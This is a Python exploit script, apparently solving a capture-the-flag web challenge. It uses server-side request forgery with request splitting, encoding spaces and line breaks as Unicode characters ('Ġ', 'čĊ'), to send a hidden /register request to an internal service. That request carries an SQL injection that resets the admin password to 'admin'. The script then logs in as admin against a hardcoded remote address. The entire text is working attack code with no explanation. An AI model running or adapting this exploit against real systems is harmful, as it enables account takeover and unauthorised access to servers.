import requests
from urllib.parse import quote

TARGET = 'http://0.0.0.0:1337'
TARGET = 'http://134.209.21.176:31113'
SPACE = 'Ġ'
NEWLINE = 'čĊ'

payload_data = 'username=admin&password=admin' + quote('\') ON CONFLICT (username) DO UPDATE SET password=\'admin\' --').replace('%20', '+')
payload_length = str(len(payload_data.encode('utf-8')))

payload =  'login' + SPACE + 'HTTP/1.1' + NEWLINE
payload += 'Host:' + SPACE + '127.0.0.1:88' + NEWLINE
payload += 'Connection:' + SPACE + 'close' + NEWLINE
payload += NEWLINE
payload += 'POST' + SPACE + '/register' + SPACE + 'HTTP/1.1' + NEWLINE
payload += 'Host:' + SPACE + '127.0.0.1' + NEWLINE
payload += 'Content-Type:' + SPACE + 'application/x-www-form-urlencoded' + NEWLINE
payload += 'Content-Length:' + SPACE + payload_length + NEWLINE
payload += 'Connection:' + SPACE + 'close' + NEWLINE
payload += NEWLINE
payload += payload_data + NEWLINE
payload += NEWLINE
payload +=  'GET' + SPACE + '/l'

payload_framework = {
    'endpoint': '127.0.0.1:80',
    'country': 'NL',
    'city': payload
}
r = requests.post(TARGET+'/api/weather', data=payload_framework)

login_data = {
    'username': 'admin',
    'password': 'admin'
}
r = requests.post(TARGET+'/login', data=login_data)
print(r.text)
